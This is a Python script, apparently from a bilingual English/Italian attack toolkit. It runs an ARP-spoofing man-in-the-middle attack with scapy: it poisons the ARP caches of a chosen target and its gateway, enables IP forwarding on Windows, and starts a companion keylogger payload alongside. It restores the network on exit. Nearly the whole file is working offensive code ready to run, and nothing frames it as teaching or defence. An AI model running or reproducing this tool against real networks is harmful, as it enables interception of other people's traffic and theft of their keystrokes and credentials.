import requests
import subprocess
import sys
import os
import time
import pythoncom
import keyboard
from threading import Semaphore
from scapy.all import Ether, ARP, srp, send


mode = ""
language = ""
target_ip = ""
host = ""


def get_lang_and_mode():
    with open("lang.txt", "r") as lang_file:
        list_ = lang_file.readlines()
        language = list_[0]
        if len(list_) == 2:
            mode = list_[1]
        else:
            mode = "terminal"
        lang_list = list(language)
        if lang_list[-1] == "\n":
            lang_list.pop()
        language = "".join(lang_list)
        if len(list_) >= 2:
            mode = list_[1]
            with open("lang.txt", "w") as lang_file:
                lang_file.write(language)
    return language, mode


def main():
    global mode, language, target_ip, host
    language, mode = get_lang_and_mode()
    # print(f"{language}, {mode}")
    loop = True
    loop_2 = True
    while loop:
        while loop_2:
            host = "192.168.1.1"
            if language == "English":
                target_ip = input("Insert the IP address of the target --> ")
            else:
                target_ip = input("Inserisci l'indirizzo IP dell'obiettivo --> ")
            if target_ip.lower() == "exit":
                if language == "English":
                    print("Goodbye!\n")
                else:
                    print("Arrivederci!\n")
                loop = False
                break
            if language == "English":
                host = input("Insert the host you wish to intercept packets for (usually the gateway) --> ")
            else:
                host = input("Inserisci l'host per cui desideri intercettare i pacchetti (di solito il gateway) --> ")
            if host.lower() == "exit":
                if language == "English":
                    print("Goodbye!\n")
                else:
                    print("Arrivederci!\n")
                loop = False
                break
            while True:
                if language == "English":
                    verbose = input("Verbosity, default is True (simple message each second) --> ")
                else:
                    verbose = input("Verbosità, la predefinita è True (messaggio semplice ogni secondo) --> ")
                if verbose.lower() == "true" or verbose.lower() == "vero" or verbose.lower() == "vera":
                    verbose = True
                    loop_2 = False
                    break
                elif verbose.lower() == "false" or verbose.lower() == "falso" or verbose.lower() == "falsa":
                    verbose = False
                    loop_2 = False
                    break
                elif verbose.lower() == "exit":
                    if language == "English":
                        print("Goodbye!\n")
                    else:
                        print("Arrivederci!\n")
                    loop = False
                    break
                else:
                    if language == "English":
                        print("You have not entered a valid choice!")
                    else:
                        print("Non hai inserito una scelta valida!")
        enable_windows_iproute()
        try:
            if "Payloads" in os.getcwd():
                with open("true.txt", "w") as true_file:
                    true_file.write("Start")
                    subprocess.Popen("keylogger.py", shell=True)
            else:
                with open("Payloads\\true.txt", "w") as true_file:
                    true_file.write("Start")
                    subprocess.Popen("Payloads\\keylogger.py", shell=True)
            while True:
                spoof(target_ip, host, verbose)
                spoof(host, target_ip, verbose)
                if "Payloads" in os.getcwd():
                    exit_str = open("true.txt", "r").read()
                else:
                    exit_str = open("Payloads\\true.txt", "r").read()
                if exit_str.lower() == "true":
                    if language == "English":
                        print("[!] Detected CTRL+S ! restoring the network, please wait...")
                    else:
                        print("[!] Rilevato CTRL+S ! ripristinando la rete, attendere prego...")
                        restore(target_ip, host)
                        restore(host, target_ip)
                        print("OK!")
                    if language == "English":
                        print("Goodbye!\n")
                    else:
                        print("Arrivederci!\n")
                    sys.exit()
                time.sleep(1)
        except Exception:
            if language == "English":
                print("[!] Detected CTRL+C ! restoring the network, please wait...")
            else:
                print("[!] Rilevato CTRL+C ! ripristinando la rete, attendere prego...")
                restore(target_ip, host)
                restore(host, target_ip)
                print("OK!")
                loop = False
                break
        if loop:
            while True:
                if language == "English":
                    choice = input("Do you want to exit the program? [Y/n]: ")
                else:
                    choice = input("Vuoi uscire dal programma? [Y/n]: ")
                choice = choice.lower()
                if choice == "y" or choice == "yes":
                    if language == "English":
                        print("Goodbye!\n")
                    else:
                        print("Arrivederci!\n")
                    loop = False
                    break
                elif choice == "n" or choice == "no":
                    if language == "English":
                        print("Returning to the menu!\n")
                    else:
                        print("Ritorno al menù!\n")
                    if mode == "menu":
                        with open("lang.txt", "a") as lang_file:
                            lang_file.write("\nmenu")
                        subprocess.Popen("arp_spoofer.bat", shell=True)
                        sys.exit()
                    else:
                        break
                else:
                    if language == "English":
                        print("You have not entered a valid choice!")
                    else:
                        print("Non hai inserito una scelta valida!")


def enable_windows_iproute():
    try:
        from services import WService
        service = WService("RemoteAccess")
        service.start()
    except Exception:
        pass


def get_mac(target_ip):
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=target_ip), timeout=3, verbose=0)
    if ans:
        return ans[0][1].src


def spoof(target_ip, host_ip, verbose=True):
    target_mac = get_mac(target_ip)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op="is-at")
    send(arp_response, verbose=0)
    if verbose:
        self_mac = ARP().hwsrc
        if language == "English":
            print(f"[+] Sent to {target_ip} : {host_ip} is-at {self_mac}")
        else:
            print(f"[+] Inviato a {target_ip} : {host_ip} is-at {self_mac}")


def restore(target_ip, host_ip, verbose=True):
    target_mac = get_mac(target_ip)
    host_mac = get_mac(host_ip)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac)
    send(arp_response, verbose=0, count=7)
    if verbose:
        if language == "English":
            print(f"[+] Sent to {target_ip} : {host_ip} is-at {host_mac}")
        else:
            print(f"[+] Inviato a {target_ip} : {host_ip} is-at {host_mac}")


if __name__ == "__main__":
    main()
